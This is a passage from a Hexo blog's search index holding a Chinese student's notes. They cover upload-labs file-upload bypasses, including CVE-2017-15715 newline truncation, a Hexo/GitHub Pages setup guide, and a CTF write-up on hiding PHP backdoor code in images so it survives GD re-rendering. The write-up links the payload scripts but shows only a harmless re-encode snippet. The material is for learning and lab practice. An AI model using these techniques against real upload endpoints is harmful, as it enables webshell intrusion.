href="https://xz.aliyun.com/t/337">https://xz.aliyun.com/t/337</a></p><h2 id="其他大佬的关于此lab的WP"><a href="#其他大佬的关于此lab的WP" class="headerlink" title="其他大佬的关于此lab的WP"></a>其他大佬的关于此lab的WP</h2><p><a href="https://github.com/LandGrey/upload-labs-writeup">https://github.com/LandGrey/upload-labs-writeup</a><br><a href="https://xz.aliyun.com/t/4029">https://xz.aliyun.com/t/4029</a><br><a href="https://www.cnblogs.com/jinqi520/p/9977256.html">https://www.cnblogs.com/jinqi520/p/9977256.html</a></p><h2 id="瞎比比"><a href="#瞎比比" class="headerlink" title="瞎比比"></a>瞎比比</h2><p>我有一个脑洞<br>大多都是In_array来进行黑白名单判断，我可以使用一个无后缀的文件<br>这样file_type=null 那么是否可以利用弱类型 0 来突破这一层限制，来保存一个无后缀的文件？<br>怎么利用？file_get_content?而且linux只要x的权限就可以执行文件，而不需要exe后缀<br>然后测试了下发现无后缀是不可能无后缀的，突破是不可能突破的，这辈子都突破不来的<br>而且利用的话jpg也可以读取里面的内容啊，jpg也不是说不能执行的对吧<br>卒<br><img src="https://raw.githubusercontent.com/corp0ra1/BlogPhoto/master/data/20190708141138.png" alt="20190708141138.png"></p><hr><h1 id="以后待完成"><a href="#以后待完成" class="headerlink" title="以后待完成"></a>以后待完成</h1><h2 id="想说的"><a href="#想说的" class="headerlink" title="想说的"></a>想说的</h2><p>目前由于暑假可能要实习，所以我想打xss,sql-labs这一套，好歹有个宏观的好基础，了解常见的漏洞类型<br>同时还需要考试将近，6级考试<br>因此如果每一个都深入研究，时间可能不够，就这样草草先结案了，等暑假补上吧</p><h2 id="move-upload-file"><a href="#move-upload-file" class="headerlink" title="move_upload_file"></a>move_upload_file</h2><p><strong>前言</strong><br>Apache版本在2.4.0到2.4.29<br>对应CVE-2017-15715，这个算是很简单，也就是move_uplod_file的一个截断方式，利用的换行符号来截断<br>也就是move_uploaded_file除了%00，还有/././.绕过，更有换行符截断的问题<br>由P牛的代码审计星球出品貌似<br><strong>再者</strong><br>三篇文章</p><p><a href="https://www.anquanke.com/post/id/a.php%E7%9A%84%E5%BD%A2%E5%BC%8F">https://www.anquanke.com/post/id/103784：通过aaa/../a.php的形式</a> 绕过move_uploaded_file的文件覆盖没有权限，而达到覆盖的效果<br><a href="http://pupiles.com/%E7%94%B1%E4%B8%80%E9%81%93ctf%E9%A2%98%E5%BC%95%E5%8F%91%E7%9A%84%E6%80%9D%E8%80%83.html">http://pupiles.com/%E7%94%B1%E4%B8%80%E9%81%93ctf%E9%A2%98%E5%BC%95%E5%8F%91%E7%9A%84%E6%80%9D%E8%80%83.html</a> ：同上<br><a href="https://skysec.top/2018/04/11/0ctf-ezdoor/">https://skysec.top/2018/04/11/0ctf-ezdoor/</a> ：比上面拓展的多，且全面<br><strong>最后</strong><br>深入底层去跟踪分析，同样的漏洞，我复现为什么和别人不同？</p><p>同时研究下空格截断的问题<br>可看##lab20下，我实现的空格截断在7.2环境下成功<br><img src="https://raw.githubusercontent.com/corp0ra1/BlogPhoto/master/data/20190708141224.png" alt="20190708141224.png"><br>但是##lab6的空格截断确7.1下失败（7.2也失败了）<br><img src="https://raw.githubusercontent.com/corp0ra1/BlogPhoto/master/data/20190708141233.png" alt="20190708141233.png"></p><h2 id="看完这个paper"><a href="#看完这个paper" class="headerlink" title="看完这个paper"></a>看完这个paper</h2><p><a href="https://paper.seebug.org/560/#_18">https://paper.seebug.org/560/#_18</a></p>]]></content>
    
    
    <categories>
      
      <category>渗透测试</category>
      
    </categories>
    
    
    <tags>
      
      <tag>渗透测试</tag>
      
      <tag>靶场</tag>
      
      <tag>文件上传</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>hexo环境的搭建</title>
    <link href="/2019/05/14/%5Bold%5Dhexo%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"/>
    <url>/2019/05/14/%5Bold%5Dhexo%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/</url>
    
    <content type="html"><![CDATA[<h1 id="github-page基本用法"><a href="#github-page基本用法" class="headerlink" title="github page基本用法"></a>github page基本用法</h1><h2 id="建立一个基本的网页"><a href="#建立一个基本的网页" class="headerlink" title="建立一个基本的网页"></a>建立一个基本的网页</h2><p><code>只能尝个鲜，有个初步了解，可以选择跳过此步骤，因为你后期会把这个仓库删掉</code></p><ul><li>  <a href="https://pages.github.com/">建站步骤官方文档</a></li><li><a href="https://www.jianshu.com/p/7124c5fe0fa7">我按照的步骤</a><br>两者都可以<h2 id="换掉中二的名字"><a href="#换掉中二的名字" class="headerlink" title="换掉中二的名字"></a>换掉中二的名字</h2> 因为发现自己最开始创建账户时候设置的ID太呆了，于是<a href="https://blog.csdn.net/qq_36667170/article/details/79067306">github用户名更改</a></li></ul><hr><h1 id="win搭建之旅"><a href="#win搭建之旅" class="headerlink" title="win搭建之旅"></a>win搭建之旅</h1><ol><li>下载node.js <a href="https://nodejs.org/en/">传送门</a><ul><li>  验证成功与否：npm -v/ode -v</li></ul></li><li>下载hexo（记得cd到你想要安装hexo的路径下执行下面命令）<ol><li> npm install hexo-cli -g</li><li> npm install hexo –save</li></ol></li><li>创建blog<ol><li> hexo init  xxxx(文件夹名)</li><li> cd xxxx</li><li> npm install</li></ol></li><li>主题修改<ol><li> 我的主题<a href="https://github.com/yscoder/hexo-theme-indigo">https://github.com/yscoder/hexo-theme-indigo</a></li><li> cd 到xxx的themems文件夹，里面只有一个landscape文件 在这个里面git clone  ysocde~~~indego.git上述主题即可</li><li> 修改_config.yml文件===&gt;theme: indigo</li><li> 安装主题相关依赖：<a href="https://github.com/yscoder/hexo-theme-indigo/wiki/%E5%AE%89%E8%A3%85">https://github.com/yscoder/hexo-theme-indigo/wiki/%E5%AE%89%E8%A3%85</a></li></ol></li><li>github的配置<ol><li> ssh配置<a href="https://blog.csdn.net/qq_38275125/article/details/82817160">https://blog.csdn.net/qq_38275125/article/details/82817160</a></li><li> 报错<code>Could not open a connection to your authentication agent</code>，先按照上面的来，不行的话就百度其他的，不同的格式吧。我找了几个，最后有效的操作是先执行  eval <code>ssh-agent</code>  （是～键上的那个`） 再执行 ssh-add ~/.ssh/rsa成功<a href="https://blog.csdn.net/roserose0002/article/details/40078577">https://blog.csdn.net/roserose0002/article/details/40078577</a></li></ol></li><li>hexo d/hexo s/hexo g操作即可<ol><li>hexo -d报错<code>ERROR Deployer not found: git</code><br>执行：npm install –save hexo-deployer-git<br><a href="https://blog.csdn.net/weixin_36401046/article/details/52940313">https://blog.csdn.net/weixin_36401046/article/details/52940313</a></li></ol></li><li> 优化图片，优化各种其他的东西。优化界面的时候推荐采用GitHub来搜索关键字，来对应文件当中的位置。比如GPL协议国际公约啥的，不知道哪个文件。就在GitHub里面搜就知道文件的位置了</li></ol><hr><h1 id="ubuntu搭建之旅"><a href="#ubuntu搭建之旅" class="headerlink" title="ubuntu搭建之旅"></a>ubuntu搭建之旅</h1><h2 id="基本环境配置nvm-nmp-nodejs-git"><a href="#基本环境配置nvm-nmp-nodejs-git" class="headerlink" title="基本环境配置nvm+nmp+nodejs+git"></a>基本环境配置nvm+nmp+nodejs+git</h2><ol><li><p>基本工具下载<br><a href="https://hexo.io/zh-cn/docs/">官方文档</a></p><ul><li><p>必须先装nvm（不能直接安装npm，死活安装不上）<br><code>wget -qO- https://raw.github.com/creationix/nvm/v0.33.11/install.sh | sh</code><br>  但是这个时候运行是无法运行的，注意下细节</p><blockquote><p>wget之后会terminal中会输出下面的这么一行字</p><blockquote><p><code>Close and reopen your terminal to start using nvm or run the following to use it now:export NVM_DIR=&quot;$HOME/.nvm&quot;</code><br>  <code>[ -s &quot;$NVM_DIR/nvm.sh&quot; ] &amp;&amp; \. &quot;$NVM_DIR/nvm.sh&quot;  # This loads nvm</code></p></blockquote></blockquote><p>  所以要想成功安装nvm还需要执行下面的<a href="https://blog.csdn.net/u012627861/article/details/83177888">步骤</a></p><ul><li>  cd ~</li><li>vim .bash_profile<blockquote><p>将export NVM_DIR … 粘贴到文件中<br>ESC -&gt; 键入”:” -&gt; 键入”wq” -&gt; 回车保存<br>让配置文件里面生效</p></blockquote><ul><li>  source .bash_profile<br>然后在执行nvm即可</li></ul></li></ul></li><li><p>剩下程序的按照官方文档，按部就班</p><ul><li>  nvm install stable</li><li>  npm install -g hexo-cli</li></ul></li></ul></li><li><p><a href="https://blog.csdn.net/pan861190079/article/details/80860153">hexo文件的建立</a></p><ol><li> mkdir blog</li><li> sudo hexo init blog/  (记得sudo，可能涉及到权限安装失败)</li><li> cd blog</li><li> sudo npm install  (同上权限)</li><li> sudo npm update -g</li><li> sudo hexo g</li><li> sudo hexo s</li></ol></li><li><p>主题的切换</p><ul><li>  <a href="https://github.com/yscoder/hexo-theme-indigo/wiki">我用的主题</a></li><li>  <a href="https://github.com/yscoder/hexo-theme-indigo/wiki/%E5%AE%8%E5%9B%BE%E5%90%8D%E5%AD%9785">安装步骤</a></li></ul></li><li><p>githubu配置</p><ul><li><p>配置SSH</p><blockquote><p>遇到的问题：Fatal： Could not read from remote repository<br>  <a href="http://idealife.github.io/2015/10/02/Hexo%E9%83%A8%E7%BD%B2%E6%97%B6%E6%8F%90%E7%A4%BAFatal%EF%BC%9A-Could-not-read-from-remote-repository%E7%9A%84%E9%97%AE%E9%A2%98%E5%A4%84%E7%90%86/">解决方案</a>:在于hexo init的时候要sudo权限，sudo hexo s的时候 他也是用的sudo权限，而上面步骤配置的ssh是普通用户权限使用的</p><blockquote><p>我的路径是/ROOT  没有前面的var（可以在ssh安装信息里面找到）<br>包括结尾的<a href="mailto:&#120;&#x78;&#120;&#120;&#64;&#113;&#x71;&#46;&#99;&#111;&#109;">&#120;&#x78;&#120;&#120;&#64;&#113;&#x71;&#46;&#99;&#111;&#109;</a>也要记得一起复制过去，即整个文件内容的copy</p></blockquote></blockquote></li><li><p>  <a href="https://www.jianshu.com/p/d1dedae4d970">yml配置文件参数介绍</a></p></li></ul></li></ol><hr><h1 id="图床-picGO-github"><a href="#图床-picGO-github" class="headerlink" title="图床=picGO+github"></a>图床=picGO+github</h1><blockquote><p>图床想了很多。主要是七牛云和阿里云等都收费，一旦不付费图片可能就都丢失，blog也就废了一半。其他免费的小图床吧，万一某天倒了又得图片各种导出也麻烦。<br>虽然GitHub访问速度慢，而且这种行为有点不道德（人家托管代码的地方给你当图床），但是GitHub免费+不会轻易倒闭，就决定他当图床了</p></blockquote><ol><li><p>下载pigGO：<a href="https://github.com/Molunerfinn/PicGo">github</a></p><ul><li>  <a href="https://blog.csdn.net/SHE_WithWings/article/details/73511345">Ubuntu安装扩展名为appimage 的文件</a>:下载的文件格式为appimage，给他可执行权限即可</li></ul></li><li><p> github仓库的配置步骤，<a href="https://blog.csdn.net/yefcion/article/details/88412025">传送门</a></p></li><li><p> vs中搜索picGO即可<br>配置参考这个以及上面github仓库的配置步骤，在剪切板的图片crtl+alt+u才会上传<br><img src="https://raw.githubusercontent.com/corp0ra1/BlogPhoto/master/data/20190528124347.png" alt="20190528124347.png"></p></li><li><p> 记得sudo apt-get install xclip，必须安装这个才可以从剪贴板复制图片然后上传</p></li></ol>]]></content>
    
    
    <categories>
      
      <category>杂</category>
      
    </categories>
    
    
    <tags>
      
      <tag>杂</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>文件上传之二次渲染</title>
    <link href="/2019/05/14/%5Bold%5D%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E4%B9%8BGD/"/>
    <url>/2019/05/14/%5Bold%5D%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E4%B9%8BGD/</url>
    
    <content type="html"><![CDATA[<h1 id="题目思路"><a href="#题目思路" class="headerlink" title="题目思路"></a>题目思路</h1><p>图片A上传之后，会提示保存在某个路径，访问该路径并下载该图片B，用记事本打开图片B，发现一串特殊字符<br><code>CREATOR: gd-jpeg v1.0 (using IJG JPEG v80)</code><br>百度后发现A上传之后是<strong>经过GD处理</strong>得到B，以下就是绕过GD库处理之后的方法</p><h1 id="方法使用前提"><a href="#方法使用前提" class="headerlink" title="方法使用前提"></a>方法使用前提</h1><p>这个POC仅限于使用JPEG V8.0的库，同时图片需要是和jpeg版本相同，才能去执行php代码（匹配下述特征字符串即可）</p><blockquote><p>CREATOR: gd-jpeg v1.0 (using IJG JPEG v80)</p></blockquote><h1 id="方法一之半自动化jio本"><a href="#方法一之半自动化jio本" class="headerlink" title="方法一之半自动化jio本"></a>方法一之半自动化jio本</h1><p>出此<a href="https://github.com/fakhrizulkifli/Defeating-PHP-GD-imagecreatefromjpeg#warning-this-poc-was-tested-using-libjpeg-v80-only-the-image-requires-the-same-libjpeg-version-in-order-to-be-able-to-execute-the-php-code">某大牛github</a></p><h2 id="方法描述"><a href="#方法描述" class="headerlink" title="方法描述"></a>方法描述</h2><ol><li> 找到一张普通的图片,用winhex打开如下，就一些简单的代码块和元数据（EXIF data）<br><img src="https://camo.githubusercontent.com/40e0cf7fa383433aab8cbef722d0ca7ba88b2403/687474703a2f2f692e696d6775722e636f6d2f785063794f366c2e706e67"></li><li> 使用脚本跑一遍之后，重新生成一张图片，此时元数据都被移除了而且几乎没有空位置给我们添加php后门<br><img src="https://camo.githubusercontent.com/5ce742099a8e55f3d767a7a694f99cc001b67308/687474703a2f2f692e696d6775722e636f6d2f415369593664382e706e67"></li><li> 但是有一些特殊的图片存在特定的特征是可以被利用的（用GD库重建之后存在以下特征的）<br><img src="https://camo.githubusercontent.com/0caae5a119b1d4c0bb4aed9504ce5086301cd100/687474703a2f2f692e696d6775722e636f6d2f696c35666841612e6a7067"></li><li> 存在SOS模块（FF DA），紧随其后的是scan header length 和scam header(00 0C 03 01 00 02 11 03 11 00 3F 00),在此之后的话你可以放置你的后门文件<br><img src="https://camo.githubusercontent.com/b73412761bc8bf6ce90d823ffc8ccf2ce676e6ed/687474703a2f2f692e696d6775722e636f6d2f586a646e695a352e706e67"></li><li> 想添加payload，再次跑一次这个脚本即可</li></ol><p>脚本如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">#第一步产生poc图片</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$jpg</span> = imagecreatefromjpeg(<span class="hljs-string">&#x27;image.jpg&#x27;</span>);<br>imagejpeg(<span class="hljs-variable">$jpg</span>, <span class="hljs-string">&#x27;poc.jpg&#x27;</span>);<br>imagedestroy(<span class="hljs-variable">$jpg</span>);<br><span class="hljs-meta">?&gt;</span><br><span class="hljs-comment">#第二步产生exploit图片</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$jpg</span> = imagecreatefromjpeg(<span class="hljs-string">&#x27;poc.jpg&#x27;</span>);<br>imagejpeg(<span class="hljs-variable">$jpg</span>, <span class="hljs-string">&#x27;exploit.jpg&#x27;</span>);<br>imagedestroy(<span class="hljs-variable">$jpg</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h1 id="方法二之全自动脚本"><a href="#方法二之全自动脚本" class="headerlink" title="方法二之全自动脚本"></a>方法二之全自动脚本</h1><h2 id="出处来源"><a href="#出处来源" class="headerlink" title="出处来源"></a>出处来源</h2><ul><li>  Ahmed自己探索出来的，算是瞎猫碰上死耗子<a href="https://secgeek.net/bookfresh-vulnerability/">传送门</a></li><li>  phil大牛真原文，讲清楚了过程<a href="https://rdot.org/forum/showthread.php?t=2780">传送门</a></li><li>  脚本源代码，需要自己存文件<a href="https://pastebin.com/3cznqi8P">传送门</a></li><li>  下载即可用的jio本<a href="https://rdot.org/forum/attachment.php?attachmentid=400&d=1372827179">传送门</a></li></ul><h2 id="使用方法："><a href="#使用方法：" class="headerlink" title="使用方法："></a>使用方法：</h2><ol><li> php安装GD库</li><li>命令方法 php jpg_payload.php 1.jgp<ul><li>  会在子目录下生成一个payload.jgp直接利用即可</li><li>  采取命令行的形式，执行命令</li><li>  phpstudy自带GD库，以命令行打开也可以</li></ul></li><li> 更改源文件中的$miniPayload变量，即可插入任何代码</li><li> 整个流程：对于存在GD过滤的，你只需上传图片a，将图片下载下来b，用该脚本处理下载下来的b图片，为payload图片，再上传即可<h2 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h2></li></ol><ul><li>  必须在图片和脚本在同一目录下，文件名中不能带路径/</li><li>  你给脚本处理的图片必须是已经经过GD处理过得，不然会发生错误。</li><li>前提是你的图片可插入payload的空白范围够。因此记得多尝试几张图片，这张不行也许下张就可以<ul><li>  画图做一个1000*1000的白色图片，处理即可（处理后为灰色）</li></ul></li></ul><h1 id="Question"><a href="#Question" class="headerlink" title="Question"></a>Question</h1><ol><li><p>为什么要利用GD处理过后的图片做二次处理，第一次不行吗？</p><blockquote><p>因为这个原理是看你被GD处理之后还存在哪些地方可以插入payload。如果你都没经过GD处理，脚本插入的payload可能被GD处理掉</p></blockquote></li><li><p>为什么我处理后的图片无效？</p><blockquote><p>多尝试几张图片去处理即可</p></blockquote></li></ol><h1 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h1><p>论脚本是怎么写出来的，还是那个phil大牛的文章</p><blockquote><p>核心：需要找到渲染前后没有变化的位置,然后将php代码写进去,就可以成功上传带有php代码的图片了</p></blockquote><h2 id="图片基础压缩知识"><a href="#图片基础压缩知识" class="headerlink" title="图片基础压缩知识"></a>图片基础压缩知识</h2><p>图片的处理过程如下<br><img src="https://www.idontplaydarts.com/images/flow1.png"></p><p>首先每一行按照字节过滤，并且该行的前缀描述的是采取的过滤器类型（0x01~0x05）不同的行可以使用不同的过滤器。这背后的基本原理是提高压缩比<br>一旦过滤所有行之后，就会使用DEFLATE算法对其进行压缩，以形成IDAT块</p><h2 id="打法思路过程"><a href="#打法思路过程" class="headerlink" title="打法思路过程"></a>打法思路过程</h2><p>迎着风上啊之逆风而行：先打败DEFLATE，再战png的行过滤器。这样GD解析的时候，也就顺风而行，从而大功告成</p><h2 id="实施步骤"><a href="#实施步骤" class="headerlink" title="实施步骤"></a>实施步骤</h2><ol><li>将字符串压缩为shell<br> 我们payload字符串不能包含重复的代码，因为他会被压缩—-&gt;设计一个没有长度超过两个字符的重复子字符串的shell</li><li>绕过PNG线路滤波器<br> 有五种不同类型的滤波器，PNG编码器决定每条线路要使用哪一种。我们现在的问题是，我们需构造一个字符串，当传递给过滤器时候会产生步骤一的字符串</li><li>构造原始图像<br> 生成一个PNG的原始图像</li><li>绕过图像变换<br> 将步骤2构造的payload加入步骤3的原始图像即可<blockquote><p>好吧 老实说，看原文吧！技术文档，尤其是英文的太难啃了，反正大概是这个意思！23333</p></blockquote></li></ol><h1 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h1><h2 id="如果非JPG文件怎么办？-GIF-PNG"><a href="#如果非JPG文件怎么办？-GIF-PNG" class="headerlink" title="如果非JPG文件怎么办？ GIF?PNG?"></a>如果非JPG文件怎么办？ GIF?PNG?</h2><p>JPG是最难的，GIF和png小case啦，参考先知上的这篇文章 <a href="https://xz.aliyun.com/t/2657">传送门</a></p>]]></content>
    
    
    <categories>
      
      <category>技术点</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>文件上传</tag>
      
      <tag>二次渲染</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
